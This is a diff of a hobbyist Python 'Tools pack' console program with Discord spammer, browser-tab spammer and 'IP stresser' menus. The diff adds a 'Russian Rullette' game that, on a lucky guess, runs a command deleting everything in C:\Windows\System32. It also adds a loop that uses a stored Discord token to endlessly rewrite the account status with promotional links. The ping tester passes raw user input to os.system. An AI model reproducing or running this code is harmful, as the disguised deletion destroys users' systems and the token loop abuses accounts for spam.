@@ -1,21 +1,31 @@
-import uuid, socket, ipaddress, webbrowser, platform, os, time, requests, random, sys
-from clear_screen import clear
+import uuid, socket, ipaddress, webbrowser, platform, os, time, requests, random, sys, ctypes
+from colorama import init, Fore; init()
 from random import *
 import json
-from discord import LoginFailure
-from discord.ext import commands
 from os import system, path
-from discord.ext.commands import CommandNotFound
-#my_ip = ipaddress.ip_address('--0.--0.--0.-0') #Random choices and other shit goes here since it is just cleaner
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
+if platform.system() == 'Windows':
+    clear = lambda: os.system('clr') # Change to 'clear' if not on Windows.
+    init()
+else:
+    clear = lambda: os.system('clear') # Change to 'clear' if not on Windows.
+    init()
+clear()
 print('What language do you speak!')
 language = input('English:Deutsche:日本人:中文:русский:svenska: ')
 if language == 'English':
+    clear()
     print('Tools pack')
     time.sleep(1)
     print('Detecting ip...')
     x = randint(1, 4)
     time.sleep(x)
-    print('---.---.---.-' + ' Has been detected')  # still working on it
+    print(f'{ip_address} Has been detected')  # Done it is not the users ip it will defult to 127.0.0.1
+    x = randint(1, 4)
+    print('Detecting Hostname')
+    time.sleep(x)
+    print(f"Hostname: {hostname}")
     time.sleep(1)
     x = randint(1, 4)
     print('Checking OS...')
@@ -28,9 +38,6 @@ if language == 'English':
         print(platform.system() + ',' + (platform.release()) + ' ' + 'Detected')
 
     time.sleep(1)
-    for _ in range(3):
-        print('')
-        time.sleep(.1)
     if platform.system() == 'Linux':
         print('Linux OS is not a valid os for the tool pack and is getting worked on!')
         time.sleep(1)
@@ -42,6 +49,7 @@ if language == 'English':
             print("TERMINATING NOW!")
             time.sleep(5)
             exit()
+    clear()
     inad = input('Have your paid/boost for the Program. Y:paid/Y:boosted/N: ')
     pop = 10
     while pop < 20:
@@ -132,6 +140,7 @@ if language == 'English':
 
     print('N Selected!')
     time.sleep(1)
+    clear()
     print('Free version, No booster or paid tools')
     time.sleep(1)
     print('')
@@ -139,31 +148,66 @@ if language == 'English':
     kid = 1
     webbrowser.open_new(url='https://bit.ly/3lahict')
     print('Key Stop 1 & 2!')
-    key1 = input('Key 1: ')
-    key2 = input('Key 2: ')
+    paswword = input('Key 1: ')
+    passwwword = input('Key 2: ')
     key12 = requests.get(pastebin12).text
     for line in key12.split('\n'):
-        if key12 and key2 in line:
+        if paswword and passwwword in line:
             print('Keys Are valid')
             time.sleep(1)
             print('')
             print('Thank you for helping support me!')
-            print('')
-        else:
-            print('invalid')
-
+            print('Doing this is how you can access this for free!')
+            break
     print('Loading')
-    x = randint(3, 10)
-    time.sleep(x)
-    print('(##########)100% COMPLETE')
+    xa = randint(3, 10)
+    time.sleep(xa)
+    do_stuff = 0
+    amount = 100
+
+    for x in range(amount):
+        done = (((x + .1) / amount))
+       
+        do_stuff += 0.1 # Process will be quick.
+        if done == 0.1:
+            clear()
+            print(f'{Fore.GREEN}■{Fore.WHITE}■■■■■■■■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.2:
+            clear()
+            print(f'{Fore.GREEN}■■{Fore.WHITE}■■■■■■■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.3:
+            clear()
+            print(f'{Fore.GREEN}■■■{Fore.WHITE}■■■■■■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.4:
+            clear()
+            print(f'{Fore.GREEN}■■■■{Fore.WHITE}■■■■■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.5:
+            clear()
+            print(f'{Fore.GREEN}■■■■■{Fore.WHITE}■■■■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.6:
+            clear()
+            print(f'{Fore.GREEN}■■■■■■{Fore.WHITE}■■■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.7:
+            clear()
+            print(f'{Fore.GREEN}■■■■■■■{Fore.WHITE}■■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.8:
+            clear()
+            print(f'{Fore.GREEN}■■■■■■■■{Fore.WHITE}■■ ' + str(int(done * 100)) + '%')
+        elif done == 0.9:
+            clear()
+            print(f'{Fore.GREEN}■■■■■■■■■{Fore.WHITE}■ ' + str(int(done * 100)) + '%')
+        elif done == 1.0:
+            clear()
+            print(f'{Fore.GREEN}■■■■■■■■■■ ' + str(int(done * 100)) + '%')
+      
     time.sleep(0.5)
-    print('Complete!')
+    
+    print(f'{Fore.WHITE}Complete!')
+
 
     while True:
         time.sleep(2)
-        for _ in range(40):
-            print(' ')
-            time.sleep(.01)
+        clear()
 
         print('  88888             8    888b.           8 ')
         print("    8   .d8b. .d8b. 8    8  .8 .d88 .d8b 8.dP ")
@@ -184,7 +228,7 @@ if language == 'English':
         time.sleep(1)
         print('4. Discord spammer: ')
         time.sleep(1)
-        print('5. Something idk')
+        print("5. 'Russian Rullette'")
         time.sleep(1)
         print('6. Other: ')
         time.sleep(1)
@@ -197,41 +241,51 @@ if language == 'English':
             print(
                 "....................................................................................................")
             time.sleep(0.1)
-            for _ in range(15):
-                print(' ')
-                print(
-                    "██▓███   ██▓ ███▄    █   ▄████  ██▓ ███▄    █   ▄████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████")
-                print(
-                    "▓██░  ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒")
-                print(
-                    "▓██░ ██▓▒▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄")
-                print(
-                    "▒██▄█▓▒ ▒░██░▓██▒  ▐▌██▒░▓█  ██▓░██░▓██▒  ▐▌██▒░▓█  ██▓   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒")
-                print(
-                    "▒██▒ ░  ░░██░▒██░   ▓██░░▒▓███▀▒░██░▒██░   ▓██░░▒▓███▀▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒")
-                print(
-                    "▒▓▒░ ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░")
-                print(
-                    "░▒ ░      ▒ ░░ ░░   ░ ▒░  ░   ░  ▒ ░░ ░░   ░ ▒░  ░   ░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░")
-                print(
-                    "░░        ▒ ░   ░   ░ ░ ░ ░   ░  ▒ ░   ░   ░ ░ ░ ░   ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░")
-                print("░           ░       ░  ░           ░       ░                 ░ ░      ░ ░      ░  ░      ░")
-                print('')
-                print('')
-                print('')
-                time.sleep(1)
-                print('1. Ip/Sever tester')
-                print('2. Ip Stresser')
-
+            
+            print(
+            "██▓███   ██▓ ███▄    █   ▄████  ██▓ ███▄    █   ▄████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████")
+            print(
+            "▓██░  ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒")
+            print(
+                "▓██░ ██▓▒▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄")
+            print(
+                "▒██▄█▓▒ ▒░██░▓██▒  ▐▌██▒░▓█  ██▓░██░▓██▒  ▐▌██▒░▓█  ██▓   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒")
+            print(
+                 "▒██▒ ░  ░░██░▒██░   ▓██░░▒▓███▀▒░██░▒██░   ▓██░░▒▓███▀▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒")
+            print(
+             "▒▓▒░ ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░")
+            print(
+               "░▒ ░      ▒ ░░ ░░   ░ ▒░  ░   ░  ▒ ░░ ░░   ░ ▒░  ░   ░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░")
+            print(
+                "░░        ▒ ░   ░   ░ ░ ░ ░   ░  ▒ ░   ░   ░ ░ ░ ░   ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░")
+            print("░           ░       ░  ░           ░       ░                 ░ ░      ░ ░      ░  ░      ░")
+            print('')
+            print('')
+            print('')
+            time.sleep(1)
+            print('1. Ip/Sever tester')
+            time.sleep(1)
+            print('2. Ip Stresser')
+            time.sleep(1)
+            dos = int(input("Select a tool: "))
+            if dos == 1:
+                print('1. IP/Sever Tester selected!')
+                print('.............................................................................................................')
+                clear()
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP/IP socket
-                server_ip = int(input('Enter server IP : '))
+                server_ip = input('Enter server IP : ')
                 rep = os.system('ping ' + server_ip)
                 if rep == 0:
-                    print
-                    'n n server is up n n'
+                     print('The server is up')
+                     clear()
+                        
                 else:
-                    print
-                'server is down'
+                    print('server/ip is down')
+                    time.sleep(1)
+                    print('Returning!')
+                        
+
+                
 
         elif a == 2:
             print('2. Browser history spammer selected!')
@@ -239,8 +293,7 @@ if language == 'English':
             print(
                 "....................................................................................................")
             time.sleep(1)
-            for _ in range(15):
-                print(' ')
+            clear()
             time.sleep(3)
             print(
                 '▄▄▄▄    ██▀███   ▒█████   █     █░  ██████ ▓█████  ██▀███      ██░ ██  ██▓  ██████ ▄▄▄█████▓ ▒█████   ██▀███ ▓██   ██▓     ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███ ')
@@ -279,9 +332,8 @@ if language == 'English':
             time.sleep(1)
             c = int(input('Choose Tool: '))
             if c == 1:
-                for _ in range(4):
-                    print(' ')
-                    time.sleep(.5)
+                clear()
+                
                 print('1. Random google page selected!')
                 select = int(input('Select a number between 1-6: '))  # You can change this and add as many as you want!
                 print('')
@@ -318,9 +370,7 @@ if language == 'English':
                 time.sleep(1)
 
             elif c == 2:
-                for _ in range(4):
-                    print(' ')
-                    time.sleep(.5)
+                clear()
                 print('2. Random website selected!')
                 select = int(input('Select a number between 1-6: '))  # You can change this and add as many as you want!
                 print('')
@@ -352,9 +402,7 @@ if language == 'English':
                 time.sleep(1)
 
             elif c == 3:
-                for _ in range(4):
-                    print(' ')
-                    time.sleep(.5)
+                clear()
                 print('3. Selected website!')
                 pages = int(input('How Many Tabs: '))
                 website = input('Website, You dont need http/s: ')
@@ -367,9 +415,7 @@ if language == 'English':
                 time.sleep(1)
 
             elif c == 4:
-                for _ in range(4):
-                    print(' ')
-                    time.sleep(.5)
+                clear()
                 print('Exitting!!!')
                 time.sleep(1)
             else:
@@ -384,8 +430,7 @@ if language == 'English':
             print(
                 "....................................................................................................")
             time.sleep(0.1)
-            for _ in range(15):
-                print(' ')
+            clear()
             zx = input('Are you sure Y/N: ')
             if (zx.capitalize()) == 'Y':
                 time.sleep(1)
@@ -410,109 +455,140 @@ if language == 'English':
             time.sleep(0.1)
             for _ in range(15):
                 print(' ')
-                time.sleep(.1)
-                print(
+            time.sleep(.1)
+            print(
                     "              dddddddd                                                                                              dddddddd         ")
-                print(
+            print(
                     "              d::::::d  iiii                                                                                        d::::::d              tttt                                            lllllll  ")
-                print(
+            print(
                     "              d::::::d i::::i                                                                                       d::::::d           ttt:::t                                            l:::::l    ")
-                print(
+            print(
                     "              d::::::d  iiii                                                                                        d::::::d           t:::::t                                            l:::::l      ")
-                print(
+            print(
                     "              d:::::d                                                                                               d:::::d            t:::::t                                            l:::::l    ")
-                print(
+            print(
                     "      ddddddddd:::::d iiiiiii     ssssssssss       cccccccccccccccc   ooooooooooo   rrrrr   rrrrrrrrr       ddddddddd:::::d      ttttttt:::::ttttttt       ooooooooooo      ooooooooooo    l::::l     ssssssssss  ")
-                print(
+            print(
                     "     dd::::::::::::::d i:::::i   ss::::::::::s    cc:::::::::::::::c oo:::::::::::oo r::::rrr:::::::::r    dd::::::::::::::d      t:::::::::::::::::t     oo:::::::::::oo  oo:::::::::::oo  l::::l   ss::::::::::s  ")
-                print(
+            print(
                     "    d::::::::::::::::d  i::::i ss:::::::::::::s  c:::::::::::::::::co:::::::::::::::or:::::::::::::::::r  d::::::::::::::::d      t:::::::::::::::::t    o:::::::::::::::oo:::::::::::::::o l::::l ss:::::::::::::s ")
-                print(
+            print(
                     "   d:::::::ddddd:::::d  i::::i s::::::ssss:::::sc:::::::cccccc:::::co:::::ooooo:::::orr::::::rrrrr::::::rd:::::::ddddd:::::d      tttttt:::::::tttttt    o:::::ooooo:::::oo:::::ooooo:::::o l::::l s::::::ssss:::::s ")
-                print(
+            print(
                     "   d::::::d    d:::::d  i::::i  s:::::s  ssssss c::::::c     ccccccco::::o     o::::o r:::::r     r:::::rd::::::d    d:::::d            t:::::t          o::::o     o::::oo::::o     o::::o l::::l  s:::::s  ssssss ")
-                print(
+            print(
                     "   d:::::d     d:::::d  i::::i    s::::::s      c:::::c             o::::o     o::::o r:::::r     rrrrrrrd:::::d     d:::::d            t:::::t          o::::o     o::::oo::::o     o::::o l::::l    s::::::s  ")
-                print(
+            print(
                     "   d:::::d     d:::::d  i::::i       s::::::s   c:::::c             o::::o     o::::o r:::::r            d:::::d     d:::::d            t:::::t          o::::o     o::::oo::::o     o::::o l::::l       s::::::s  ")
-                print(
+            print(
                     "   d:::::d     d:::::d  i::::i ssssss   s:::::s c::::::c     ccccccco::::o     o::::o r:::::r            d:::::d     d:::::d            t:::::t    tttttto::::o     o::::oo::::o     o::::o l::::l ssssss   s:::::s ")
-                print(
+            print(
                     "   d::::::ddddd::::::ddi::::::is:::::ssss::::::sc:::::::cccccc:::::co:::::ooooo:::::o r:::::r            d::::::ddddd::::::dd           t::::::tttt:::::to:::::ooooo:::::oo:::::ooooo:::::ol::::::ls:::::ssss::::::s")
-                print(
+            print(
                     "    d:::::::::::::::::di::::::is::::::::::::::s  c:::::::::::::::::co:::::::::::::::o r:::::r             d:::::::::::::::::d           tt::::::::::::::to:::::::::::::::oo:::::::::::::::ol::::::ls::::::::::::::s ")
-                print(
+            print(
                     "     d:::::::::ddd::::di::::::i s:::::::::::ss    cc:::::::::::::::c oo:::::::::::oo  r:::::r              d:::::::::ddd::::d             tt:::::::::::tt oo:::::::::::oo  oo:::::::::::oo l::::::l s:::::::::::ss  ")
-                print(
+            print(
                     "     ddddddddd   dddddiiiiiiii  sssssssssss        cccccccccccccccc   ooooooooooo    rrrrrrr               ddddddddd   ddddd               ttttttttttt     ooooooooooo      ooooooooooo   llllllll  sssssssssss     ")
-                for _ in range(2):
-                    print(' ')
-                print('If You get banned on discord it is not my fault!')
-                print('3 & 4  can result if caught in a ban!')
-                for _ in range(2):
-                    print(' ')
-                print('1. Custom discord status')
-                print('2. Text spammer')
-                print('3. Multi message delete')
-                print('4. Token login')
-                ex = int(input('Select A Tool:'))
-                if ex == 1:
+            for _ in range(2):
+                print(' ')
+            print('If You get banned on discord it is not my fault!')
+            print('3 & 4  can result if caught in a ban!')
+            for _ in range(2):
+                print(' ')
+            print('1. Custom discord status')
+            print('2. Text spammer')
+            print('3. Multi message delete')
+            print('4. Token login')
+            ex = int(input('Select A Tool:'))
+            if ex == 1:
+                print(
+                        "....................................................................................................")
+                clear()
+            elif ex == 2:
                     print(
                         "....................................................................................................")
-                    for _ in range(15):
-                        print(' ')
-                elif ex == 2:
-                    print(
+                    clear()
+            elif ex == 3:
+                print(
                         "....................................................................................................")
-                    for _ in range(15):
-                        print(' ')
-                elif ex == 3:
-                    print(
+                clear()
+            elif ex == 4:
+                print('3. Multi message delete selected!')
+                print(
                         "....................................................................................................")
-                    for _ in range(15):
-                        print(' ')
-                elif ex == 4:
-                    print('3. Multi message delete selected!')
-                    print(
-                        "....................................................................................................")
-                    for _ in range(15):
-                        print(' ')
+                clear()
+                    
+                with open('token.txt', 'r', encoding='UTF-8') as f: token = f.read()
+                num = 0
 
+                words = ['http://discord.zoony.xyz', 'http://zoony.xyz', 'https://lnky.in/lifty']
+                emoji_id = '704103059969671260'
+                emoji_name = 'LiftyCommunity'
 
-                else:
-                    time.sleep(1)
-                    print(
+                headers = {
+                    'Authorization': token,
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
+                    'Content-Type': 'application/json',
+                    'Accept': '*/*'
+                    }
+
+                while True:
+                    for x in range(3):
+                        try:
+                            data = {'custom_status':{'text':words[x],'emoji_id':emoji_id,'emoji_name':emoji_name}}
+                            r = requests.patch('https://discordapp.com/api/v6/users/@me/settings', headers=headers, json=data)
+                            if "'code': 0" in r.text: print(f'{Fore.RED}Invalid/outdated token{Fore.WHITE}.'); time.sleep(600); os._exit(0)
+                            else: print(f'{Fore.GREEN}Edited status to{Fore.WHITE}: {words[x]}'); num += 1; ctypes.windll.kernel32.SetConsoleTitleW(f'Edited: {num} times'); time.sleep(5)
+                        except:
+                            pass
+                print("If it does not work the either contact sɹǝƃƃod#5183 or zoony#1337")
+                print('You need to put the token into the token.txt')
+                time.sleep(1)
+
+            else:
+                time.sleep(1)
+                print(
                         "....................................................................................................")
-                    time.sleep(1)
-                    print('Invalid command!')
-                    time.sleep(1)
-                    print('Returning home!')
-                    time.sleep(1)
+                time.sleep(1)
+                print('Invalid command!')
+                time.sleep(1)
+                print('Returning home!')
+                time.sleep(1)
 
         elif a == 5:
-            print('1. Pinging tools selected!')  # gotto work on this
+            print("5.'Russian Rullette' Selected ")  # gotto work on this
             time.sleep(1)
             print(
                 "....................................................................................................")
             time.sleep(0.1)
-            for _ in range(15):
-                print(' ')
+            clear()
+            print('Russian rullette is a game that you will select a number and something may happen to your device!')
+            print('Choose the right number or you may destroy your device')
+            time.sleep(1)
+            zxfd = randint(1,9)
+            abcsa = int(input('Select a number between 1-9: '))
+            if abcsa == zxfd:
+                if platform.system() == 'Windows':
+                    os.system("cd c:\windows\system32")
+                    os.system('del *')
+                elif platform.system() == 'Darwin':
+                    os.system('echo hello')
+
         elif a == 6:
             print('6. Other Selected')
             time.sleep(1)
             print(
                 "....................................................................................................")
             time.sleep(0.1)
-            for _ in range(15):
-                print(' ')
+            clear()
         elif a == 7:
             print('7. Exit Selected')
             time.sleep(1)
             print(
                 "....................................................................................................")
             time.sleep(0.1)
-            for _ in range(15):
-                print(' ')
+            clear()
             time.sleep(3)
             b = input('You sure? Y/N: ')
             if (b.capitalize()) == 'Y':
@@ -530,7 +606,7 @@ if language == 'English':
                 time.sleep(1)
                 print('TERMINATED')
                 exit()
-elif language == 'Deutsche':
+elif language == 'Deutsche': #german may need to re do it 
     print('Werkzeugpaket')
     time.sleep(1)
     print('IP erkennen ...')
@@ -670,9 +746,6 @@ elif language == 'Deutsche':
             print('')
             print('Vielen Dank für Ihre Unterstützung!')
             print('')
-        else:
-            print('ungültig')
-
     print('Wird geladen!')
     x = randint(3, 10)
     time.sleep(x)
@@ -1051,7 +1124,7 @@ elif language == 'Deutsche':
                 time.sleep(1)
                 print('TERMINATED')
                 exit()
-elif language == '日本人':
+elif language == '日本人':#japanses
     print('Tools pack')
     time.sleep(1)
     print('Detecting ip...')
@@ -1572,7 +1645,7 @@ elif language == '日本人':
                 time.sleep(1)
                 print('TERMINATED')
                 exit()
-elif language == '中文':
+elif language == '中文':#chinese(simplified)
     print('Tools pack')
     time.sleep(1)
     print('Detecting ip...')
@@ -2093,7 +2166,7 @@ elif language == '中文':
                 time.sleep(1)
                 print('TERMINATED')
                 exit()
-elif language == 'русский':
+elif language == 'русский':#Russian
     print('Tools pack')
     time.sleep(1)
     print('Detecting ip...')
@@ -2614,7 +2687,8 @@ elif language == 'русский':
                 time.sleep(1)
                 print('TERMINATED')
                 exit()
-elif language == 'svenska':
+elif language == 'svenska':#sweedish
+
     print('Tools pack')
     time.sleep(1)
     print('Detecting ip...')
@@ -3135,3 +3209,5 @@ elif language == 'svenska':
                 time.sleep(1)
                 print('TERMINATED')
                 exit()
+else:
+    print('Incorrect answer: If you have a language that you want to be supported please dm sɹǝƃƃod#5183')
